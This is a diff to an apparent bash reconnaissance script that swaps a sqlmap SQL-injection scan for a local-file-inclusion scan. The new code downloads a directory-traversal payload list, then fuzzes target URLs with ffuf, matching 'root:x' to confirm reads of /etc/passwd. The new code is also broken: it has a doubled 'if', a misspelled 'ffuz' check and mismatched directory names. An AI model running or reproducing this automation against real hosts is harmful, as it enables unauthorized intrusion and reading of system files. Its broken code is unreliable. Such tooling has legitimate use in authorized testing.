@@ -24,11 +24,11 @@ else
   mkdir ~/reconizer/$DOM/vulnerabilities
 fi
 
-if [ -d ~/reconizer/$DOM/vulnerabilities/sqli]
+if [ -d ~/reconizer/$DOM/vulnerabilities/lfi]
 then
   echo " "
 else
-  mkdir ~/reconizer/$DOM/vulnerabilities/sqli
+  mkdir ~/reconizer/$DOM/vulnerabilities/lfi
 fi
 
 echo "${red}
@@ -41,21 +41,25 @@ echo "${red}
 |                                                 |
  ================== Anon-Artist ==================
 ${reset}"
-echo "${blue} [+] Started sqli Vulnerability Scanning ${reset}"
+echo "${blue} [+] Started lfi Vulnerability Scanning ${reset}"
 echo " "
 
-#sqli
+#lfi
 echo "${yellow} ---------------------------------- xxxxxxxx ---------------------------------- ${reset}"
 echo " "
-if [ -f ~/usr/bin/sqlmap ]
+if if [[ ! -f ~/reconizer/$DOM/tools/dotdotpwn.txt ]]
 then
-echo -e ${CG}"\n[+] Searching For SQL Injection:- "
-sqlmap -m $DOM/GF_Pattern/sql.txt --batch --random-agent --level 1 | tee $DOM/vulnerabilities/sqli/sqlmap.txt
+wget https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Directory%20Traversal/Intruder/dotdotpwn.txt 
+cat dotdotpwn.txt | head -n 120 > ~/reconizer/$DOM/tools/lfipayloads.txt
+if [ -f ~/go/bin/ffuz ]
+then
+echo -e ${CG}"\n[+] Searching For LFI Injection:- "
+cat ~/reconizer/$DOM/GF_Patterns/lfi.txt | qsreplace FUZZ | while read url ; do ffuf -u $url -mr "root:x" -w ~/reconizer/$DOM/tools/lfipayloads.txt -of csv -o ~/reconizer/$DOM/vulnerabilities/LFI/lfi.txt -t 50 -c  ; done
 else
-  echo "${blue} [+] Installing sqli ${reset}"
-  sudo apt install sqlmap
-echo -e ${CG}"\n[+] Searching For SQL Injection:- "
-sqlmap -m $DOM/GF_Pattern/sql.txt --batch --random-agent --level 1 | tee $DOM/vulnerabilities/sqli/sqlmap.txt
+  echo "${blue} [+] Installing lfi ${reset}"
+  go install github.com/ffuf/ffuf/v2@latest
+echo -e ${CG}"\n[+] Searching For LFI Injection:- "
+cat ~/reconizer/$DOM/GF_Patterns/lfi.txt | qsreplace FUZZ | while read url ; do ffuf -u $url -mr "root:x" -w ~/reconizer/$DOM/tools/lfipayloads.txt -of csv -o ~/reconizer/$DOM/vulnerabilities/LFI/lfi.txt -t 50 -c  ; done
 fi
 
 echo "${yellow} ---------------------------------- xxxxxxxx ---------------------------------- ${reset}"
